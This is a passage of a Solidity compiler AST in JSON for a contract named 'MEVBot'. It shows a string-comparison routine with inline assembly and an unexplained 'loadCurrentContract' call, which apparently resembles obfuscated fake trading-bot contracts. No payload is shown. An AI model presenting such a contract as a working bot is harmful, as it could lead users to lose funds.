																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 104,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 329,
																	"src": "1668:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 106,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1668:43:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 107,
															"nodeType": "ExpressionStatement",
															"src": "1668:43:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1734:88:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1752:19:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1763:7:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1757:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1757:14:0"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1752:1:0"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1788:20:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1799:8:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1793:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1793:15:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1788:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 87,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1752:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 90,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1788:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 71,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1799:8:0",
																	"valueSize": 1
																},
																{
																	"declaration": 66,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1763:7:0",
																	"valueSize": 1
																}
															],
															"id": 108,
															"nodeType": "InlineAssembly",
															"src": "1725:97:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 111,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 109,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 87,
																	"src": "1840:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 110,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 90,
																	"src": "1845:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1840:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 165,
															"nodeType": "IfStatement",
															"src": "1836:400:0",
															"trueBody": {
																"id": 164,
																"nodeType": "Block",
																"src": "1848:388:0",
																"statements": [
																	{
																		"assignments": [
																			113
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 113,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 164,
																				"src": "1949:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 112,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1949:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 119,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 117,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "-",
																					"prefix": true,
																					"src": "1972:2:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 116,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1973:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				],
																				"id": 115,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "1964:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 114,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1964:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 118,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1964:11:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1949:26:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 122,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 120,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 50,
																				"src": "1997:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3332",
																				"id": 121,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2008:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "1997:13:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 142,
																		"nodeType": "IfStatement",
																		"src": "1994:103:0",
																		"trueBody": {
																			"id": 141,
																			"nodeType": "Block",
																			"src": "2012:85:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 139,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 123,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 113,
																							"src": "2032:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 138,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "2039:39:0",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 136,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 134,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 124,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "2041:1:0",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 132,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 125,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "2047:1:0",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 130,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 128,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 126,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "2052:2:0",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 127,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 50,
																																			"src": "2057:8:0",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "2052:13:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 129,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 76,
																																		"src": "2068:3:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "2052:19:0",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 131,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "2051:21:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "2047:25:0",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 133,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "2046:27:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "2041:32:0",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 135,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "2076:1:0",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "2041:36:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 137,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "2040:38:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2032:46:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 140,
																					"nodeType": "ExpressionStatement",
																					"src": "2032:46:0"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			144
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 144,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 164,
																				"src": "2114:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 143,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2114:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 154,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 153,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 147,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 145,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 87,
																							"src": "2130:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 146,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 113,
																							"src": "2134:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2130:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 148,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2129:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 151,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 149,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 90,
																							"src": "2143:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 150,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 113,
																							"src": "2147:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2143:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 152,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2142:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2129:23:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2114:38:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 157,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 155,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 144,
																				"src": "2174:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 156,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2182:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2174:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 163,
																		"nodeType": "IfStatement",
																		"src": "2170:51:0",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 160,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 144,
																						"src": "2216:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 159,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2212:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 158,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2212:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 161,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2212:9:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 48,
																			"id": 162,
																			"nodeType": "Return",
																			"src": "2205:16:0"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 168,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 166,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 66,
																	"src": "2249:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 167,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2260:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2249:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 169,
															"nodeType": "ExpressionStatement",
															"src": "2249:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 172,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 170,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 71,
																	"src": "2276:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 171,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2288:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2276:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 173,
															"nodeType": "ExpressionStatement",
															"src": "2276:14:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 81,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 79,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 76,
														"src": "1297:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 80,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 50,
														"src": "1303:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1297:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 175,
												"initializationExpression": {
													"assignments": [
														76
													],
													"declarations": [
														{
															"constant": false,
															"id": 76,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 175,
															"src": "1283:8:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 75,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1283:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 78,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 77,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1294:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1283:12:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 84,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 82,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 76,
															"src": "1313:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1320:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1313:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 85,
													"nodeType": "ExpressionStatement",
													"src": "1313:9:0"
												},
												"nodeType": "ForStatement",
												"src": "1278:1023:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 186,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 178,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 42,
																	"src": "2321:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																		"typeString": "struct MEVBot.slice memory"
																	}
																},
																"id": 179,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 37,
																"src": "2321:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 177,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2317:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 176,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2317:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 180,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2317:14:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 183,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 44,
																	"src": "2338:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																		"typeString": "struct MEVBot.slice memory"
																	}
																},
																"id": 184,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 37,
																"src": "2338:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
